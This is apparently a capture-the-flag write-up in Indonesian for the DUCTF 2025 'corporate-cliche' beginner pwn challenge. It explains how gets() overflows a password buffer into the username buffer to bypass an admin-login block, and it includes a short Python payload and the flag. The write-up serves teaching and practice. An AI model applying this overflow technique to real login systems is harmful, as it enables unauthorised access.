# corporate-cliche – Pwn – Beginner

**Remote:**  
nc chal.2025.ductf.net 30000

---

## Deskripsi

> It's time to really **push the envelope** and go **above and beyond!** We've got a new challenge for you. Can you find a way to get into our email server?

Kita diberikan sebuah source code program C yang meniru sistem login email. Tujuan dari challenge ini adalah mendapatkan akses shell dengan menyamar sebagai admin, meskipun terdapat proteksi yang melarang login langsung sebagai user admin.

---

## Analisis Source Code
1. Struktur Login

```
const char* logins[][2] = {
    {"admin", "🇦🇩🇲🇮🇳"},
    {"guest", "guest"},
};
```
Terdapat dua akun:
- admin dengan password emoji 🇦🇩🇲🇮🇳
- guest dengan password "guest"

2. Cek Username
```
if (strcmp(username, "admin") == 0) {
    printf("-> Admin login is disabled. Access denied.\n");
    exit(0);
}
```
Jika kita mencoba login dengan username admin, program langsung menolak akses dan keluar.
3. Input Password Rentan
```
printf("Enter your password: ");
gets(password);
```
Penggunaan fungsi gets() membuat aplikasi rentan terhadap buffer overflow, karena tidak ada batasan panjang input.
4. Susunan Buffer
```
char password[32];
char username[32];
```
Variabel password berada di stack sebelum username. Karena gets() menulis ke password, kita bisa melakukan overflow hingga menimpa nilai username.

---

## Teknik Eksploitasi
### Tujuan
Melewati cek strcmp(username, "admin") == 0) dengan cara menulis "admin" ke dalam username melalui overflow dari password.
### Langkah:
1. Saat input username, gunakan "guest" agar melewati validasi awal.
2. Kirim password dalam format:
   - Password admin emoji (🇦🇩🇲🇮🇳, encoded dalam UTF-8 = 16 byte)
   - Tambahkan null byte (\x00) hingga mencapai 32 byte
   - Lanjutkan dengan string "admin" dan \x00 untuk menimpa username
### Payload:
```python
admin_pw = "🇦🇩🇲🇮🇳".encode('utf-8')   
payload = admin_pw + b"\x00" * (32 - len(admin_pw)) 
payload += b"admin\x00"
```

## Eksploitasi dengan Python (pwntools)
[exploit.py](./exploit.py)

## Flag
Setelah berhasil mendapatkan shell, baca file flag.txt

> DUCTF{wow_you_really_boiled_the_ocean_the_shareholders_thankyou}

